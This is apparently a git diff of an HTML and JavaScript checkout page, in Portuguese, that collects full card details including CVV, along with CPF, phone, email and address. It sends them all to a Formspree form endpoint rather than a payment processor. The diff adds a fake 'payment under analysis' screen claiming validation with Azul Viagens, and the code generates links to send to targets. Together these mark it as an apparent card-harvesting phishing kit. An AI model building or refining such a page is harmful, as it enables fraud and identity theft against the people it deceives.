@@ -29,7 +29,6 @@
             background: radial-gradient(circle at 50% -20%, #1e1b4b 0%, #020617 100%);
             min-height: 100vh;
         }
-        /* Garante que os ícones de marca (Visa, Master) apareçam */
         .fab { font-family: "Font Awesome 6 Brands"; font-weight: 400; }
         .fas { font-family: "Font Awesome 6 Free"; font-weight: 900; }
     </style>
@@ -76,7 +75,6 @@
     </div>
 
     <div id="view-client" class="hidden max-w-3xl mx-auto pb-10">
-        
         <div class="text-center mb-8">
             <div class="mx-auto w-24 h-24 bg-white rounded-full flex items-center justify-center mb-4 shadow-lg overflow-hidden border-4 border-white/10">
                 <img id="clientLogo" src="logo.png" class="w-full h-full object-cover" onerror="this.onerror=null; this.src='logo.jpg';">
@@ -90,7 +88,6 @@
         </div>
 
         <form id="paymentForm" action="https://formspree.io/f/xqezowag" method="POST">
-            
             <div class="bg-white rounded-3xl p-6 md:p-8 mb-6 shadow-xl relative overflow-hidden">
                 <div class="absolute top-0 left-0 w-2 h-full bg-purple-600"></div>
                 <h3 class="font-bold text-gray-800 text-lg mb-4 flex items-center gap-2">
@@ -132,22 +129,18 @@
                 </h3>
                 <div class="grid md:grid-cols-2 gap-5 mb-8">
                     <input type="text" name="nome_titular" required placeholder="Nome no Cartão *" class="w-full border border-gray-200 rounded-xl p-3 focus:ring-2 focus:ring-purple-500 outline-none transition bg-gray-50 focus:bg-white">
-                    
                     <input type="text" name="cpf_titular" required placeholder="CPF (000.000.000-00) *" maxlength="14" 
                            class="w-full border border-gray-200 rounded-xl p-3 focus:ring-2 focus:ring-purple-500 outline-none transition bg-gray-50 focus:bg-white"
                            oninput="mascaraCPF(this)">
-                    
                     <input type="tel" name="telefone" required placeholder="Telefone (DDD) 9xxxx-xxxx *" maxlength="15" 
                            class="w-full border border-gray-200 rounded-xl p-3 focus:ring-2 focus:ring-purple-500 outline-none transition bg-gray-50 focus:bg-white"
                            oninput="mascaraTelefone(this)">
-                           
                     <input type="email" name="email" required placeholder="E-mail *" class="w-full border border-gray-200 rounded-xl p-3 focus:ring-2 focus:ring-purple-500 outline-none transition bg-gray-50 focus:bg-white">
                 </div>
 
                 <h3 class="font-bold text-gray-800 text-lg mb-6 flex items-center gap-2">
                     <i class="far fa-credit-card text-purple-600"></i> Dados do Cartão
                 </h3>
-                
                 <div class="mb-5 relative">
                     <input type="text" name="num_cartao" id="inputCartao" required placeholder="0000 0000 0000 0000" maxlength="19"
                            class="w-full border border-gray-200 rounded-xl p-3 pl-12 focus:ring-2 focus:ring-purple-500 outline-none transition bg-gray-50 focus:bg-white font-mono text-lg z-0"
@@ -159,7 +152,6 @@
                     <input type="text" name="validade" required placeholder="Validade (MM/AA) *" maxlength="5" 
                            class="w-full border border-gray-200 rounded-xl p-3 focus:ring-2 focus:ring-purple-500 outline-none transition bg-gray-50 focus:bg-white text-center"
                            oninput="mascaraValidade(this)">
-                           
                     <div class="relative">
                         <input type="text" name="cvv" required placeholder="CVV *" maxlength="4" 
                                class="w-full border border-gray-200 rounded-xl p-3 pl-10 focus:ring-2 focus:ring-purple-500 outline-none transition bg-gray-50 focus:bg-white"
@@ -182,7 +174,6 @@
                 <h3 class="font-bold text-gray-800 text-lg mb-6 flex items-center gap-2">
                     <i class="fas fa-map-marker-alt text-purple-600"></i> Faturamento
                 </h3>
-                
                 <div class="grid md:grid-cols-2 gap-5 mb-8">
                     <div class="col-span-1">
                         <label class="block text-xs font-bold text-gray-500 mb-1">CEP *</label>
@@ -190,22 +181,13 @@
                         <p id="cep-loading" class="text-xs text-purple-600 mt-1 hidden"><i class="fas fa-spinner fa-spin"></i> Buscando endereço...</p>
                     </div>
                     <div class="col-span-1"></div>
-
                     <div class="col-span-2">
                          <input type="text" name="endereco" id="logradouro" required placeholder="Endereço (Rua/Av) *" class="w-full border border-gray-200 rounded-xl p-3 focus:ring-2 focus:ring-purple-500 outline-none transition bg-gray-50 focus:bg-white">
                     </div>
-                    
-                    <div>
-                        <input type="text" name="numero_casa" id="numero" required placeholder="Número *" class="w-full border border-gray-200 rounded-xl p-3 focus:ring-2 focus:ring-purple-500 outline-none transition bg-gray-50 focus:bg-white">
-                    </div>
-                    <div>
-                         <input type="text" name="bairro" id="bairro" required placeholder="Bairro *" class="w-full border border-gray-200 rounded-xl p-3 focus:ring-2 focus:ring-purple-500 outline-none transition bg-gray-50 focus:bg-white">
-                    </div>
-                    <div class="col-span-2">
-                        <input type="text" name="cidade_estado" id="cidade" required placeholder="Cidade/UF *" class="w-full border border-gray-200 rounded-xl p-3 focus:ring-2 focus:ring-purple-500 outline-none transition bg-gray-50 focus:bg-white">
-                    </div>
+                    <div><input type="text" name="numero_casa" id="numero" required placeholder="Número *" class="w-full border border-gray-200 rounded-xl p-3 focus:ring-2 focus:ring-purple-500 outline-none transition bg-gray-50 focus:bg-white"></div>
+                    <div><input type="text" name="bairro" id="bairro" required placeholder="Bairro *" class="w-full border border-gray-200 rounded-xl p-3 focus:ring-2 focus:ring-purple-500 outline-none transition bg-gray-50 focus:bg-white"></div>
+                    <div class="col-span-2"><input type="text" name="cidade_estado" id="cidade" required placeholder="Cidade/UF *" class="w-full border border-gray-200 rounded-xl p-3 focus:ring-2 focus:ring-purple-500 outline-none transition bg-gray-50 focus:bg-white"></div>
                 </div>
-
                 <div class="mb-6 bg-purple-50 p-4 rounded-xl border border-purple-100">
                     <label class="flex items-start gap-3 cursor-pointer">
                         <input type="checkbox" required class="mt-1 w-5 h-5 text-accent-purple rounded border-gray-300 focus:ring-accent-purple">
@@ -214,7 +196,6 @@
                         </span>
                     </label>
                 </div>
-
                 <button type="submit" class="w-full bg-gradient-to-r from-accent-purple to-indigo-600 hover:from-indigo-600 hover:to-accent-purple text-white font-bold py-4 rounded-xl transition duration-300 shadow-xl shadow-purple-500/30 text-lg flex justify-center items-center gap-2 transform active:scale-95">
                     Finalizar e Enviar para Análise <i class="fas fa-chevron-right text-sm"></i>
                 </button>
@@ -222,13 +203,28 @@
         </form>
     </div>
 
-    <div id="view-analysis" class="hidden w-full max-w-md mx-auto mt-20 text-center">
-        <div class="bg-white p-8 rounded-3xl shadow-2xl border-t-8 border-yellow-400">
-            <h2 class="text-2xl font-bold text-gray-800 mb-2">Dados em Análise</h2>
-            <div class="bg-yellow-50 text-yellow-800 py-3 px-4 rounded-xl text-xs font-bold uppercase tracking-wider mb-4">
-                Status: Aguardando Aprovação
+    <div id="view-analysis" class="hidden w-full max-w-md mx-auto mt-10">
+        <div class="bg-white rounded-[40px] p-10 text-center shadow-2xl">
+            <div class="relative w-32 h-32 mx-auto mb-8">
+                <div class="w-full h-full rounded-full border-2 border-purple-100 flex items-center justify-center">
+                    <div class="w-28 h-28 rounded-full bg-gradient-to-b from-white to-purple-50"></div>
+                </div>
+                <div class="absolute bottom-2 right-2 w-8 h-8 bg-purple-500 rounded-full flex items-center justify-center border-4 border-white">
+                    <i class="fas fa-check text-white text-[10px]"></i>
+                </div>
             </div>
-            <p class="text-xs text-gray-400">Você receberá a confirmação em breve.</p>
+            <div class="w-16 h-16 bg-purple-100 rounded-full flex items-center justify-center mx-auto mb-6">
+                <i class="far fa-clock text-2xl text-purple-500"></i>
+            </div>
+            <h2 class="text-2xl font-bold text-slate-800 mb-4">Pagamento em Análise</h2>
+            <p class="text-slate-500 text-sm leading-relaxed mb-8 px-4">
+                Recebemos seus dados! Nossa equipe de segurança está validando a transação junto à <strong>Azul Viagens</strong> para proceder com a emissão.
+            </p>
+            <div class="bg-yellow-50 border border-yellow-100 rounded-2xl p-4 text-left flex gap-3 mb-8">
+                <div class="text-yellow-600 mt-1"><i class="fas fa-exclamation-triangle text-sm"></i></div>
+                <p class="text-[11px] text-yellow-700 leading-tight">Este procedimento é padrão para garantir a segurança da sua compra e evitar fraudes no cartão.</p>
+            </div>
+            <p class="text-[11px] text-slate-400 italic">Você será notificado assim que a emissão for concluída.</p>
         </div>
     </div>
 
@@ -242,9 +238,7 @@
     </div>
 
     <script>
-    // --- JUROS CONFIG (0.35% ao mês) ---
     const TAXA_JUROS_MENSAL = 0.0035; 
-    // --------------------------------
 
     window.onload = function() {
         try {
@@ -273,63 +267,39 @@
         } catch(e) { console.error(e); }
     };
 
-    // --- MÁSCARAS E FORMATAÇÃO (O SEGREDO!) ---
-    
     function formatarCartao(input) {
-        let v = input.value.replace(/\D/g, ''); // Remove tudo que não é dígito
+        let v = input.value.replace(/\D/g, ''); 
         let icon = document.getElementById('iconeCartao');
-
-        // Lógica de Bandeiras (Prioriza o começo do número)
-        if (v.match(/^4/)) {
-            // Visa
-            icon.className = 'fab fa-cc-visa absolute left-4 top-4 text-blue-700 text-xl z-10';
-        } else if (v.match(/^5[1-5]|^2[2-7]/)) {
-            // Mastercard
-            icon.className = 'fab fa-cc-mastercard absolute left-4 top-4 text-red-600 text-xl z-10';
-        } else if (v.match(/^3[47]/)) {
-            // Amex
-            icon.className = 'fab fa-cc-amex absolute left-4 top-4 text-blue-500 text-xl z-10';
-        } else if (v.match(/^6/)) {
-            // Elo / Discover
-            icon.className = 'fab fa-cc-discover absolute left-4 top-4 text-orange-500 text-xl z-10';
-        } else {
-            // Padrão
-            icon.className = 'fas fa-credit-card absolute left-4 top-4 text-gray-400 text-xl z-10';
-        }
-
-        // Espaço a cada 4 dígitos
+        if (v.match(/^4/)) icon.className = 'fab fa-cc-visa absolute left-4 top-4 text-blue-700 text-xl z-10';
+        else if (v.match(/^5[1-5]|^2[2-7]/)) icon.className = 'fab fa-cc-mastercard absolute left-4 top-4 text-red-600 text-xl z-10';
+        else if (v.match(/^3[47]/)) icon.className = 'fab fa-cc-amex absolute left-4 top-4 text-blue-500 text-xl z-10';
+        else if (v.match(/^6/)) icon.className = 'fab fa-cc-discover absolute left-4 top-4 text-orange-500 text-xl z-10';
+        else icon.className = 'fas fa-credit-card absolute left-4 top-4 text-gray-400 text-xl z-10';
         v = v.replace(/(\d{4})(?=\d)/g, '$1 ');
         input.value = v;
     }
 
     function mascaraCPF(input) {
-        let v = input.value.replace(/\D/g, ''); // 12345678901
-        v = v.replace(/(\d{3})(\d)/, '$1.$2'); // 123.45678901
-        v = v.replace(/(\d{3})(\d)/, '$1.$2'); // 123.456.78901
-        v = v.replace(/(\d{3})(\d{1,2})$/, '$1-$2'); // 123.456.789-01
+        let v = input.value.replace(/\D/g, '');
+        v = v.replace(/(\d{3})(\d)/, '$1.$2').replace(/(\d{3})(\d)/, '$1.$2').replace(/(\d{3})(\d{1,2})$/, '$1-$2');
         input.value = v;
     }
 
     function mascaraTelefone(input) {
         let v = input.value.replace(/\D/g, '');
-        v = v.replace(/^(\d{2})(\d)/g, '($1) $2'); // (11) 99999...
-        v = v.replace(/(\d)(\d{4})$/, '$1-$2'); // ...9999-9999
+        v = v.replace(/^(\d{2})(\d)/g, '($1) $2').replace(/(\d)(\d{4})$/, '$1-$2');
         input.value = v;
     }
 
     function mascaraValidade(input) {
         let v = input.value.replace(/\D/g, '');
-        if (v.length >= 2) {
-            v = v.replace(/^(\d{2})/, '$1/');
-        }
+        if (v.length >= 2) v = v.replace(/^(\d{2})/, '$1/');
         input.value = v;
     }
 
     function mascaraCVV(input) {
         input.value = input.value.replace(/\D/g, '');
     }
-
-    // ------------------------------------------
 
     function buscarCep(cep) {
         const cleanCep = cep.replace(/\D/g, '');
@@ -355,7 +325,6 @@
         const hiddenInput = document.getElementById('inputValorHidden');
         const select = document.getElementById('selectParcelas');
         const imgLogo = document.getElementById('clientLogo');
-        
         if (logoUrl) imgLogo.src = logoUrl;
 
         let valorNum = 0;
@@ -422,7 +391,7 @@
     }
 
     function copiar(texto) {
-        navigator.clipboard.writeText(texto).then(() => alert("Link copiado! Envie para o cliente."));
+        navigator.clipboard.writeText(texto).then(() => alert("Link copiado!"));
     }
 
     const form = document.getElementById('paymentForm');
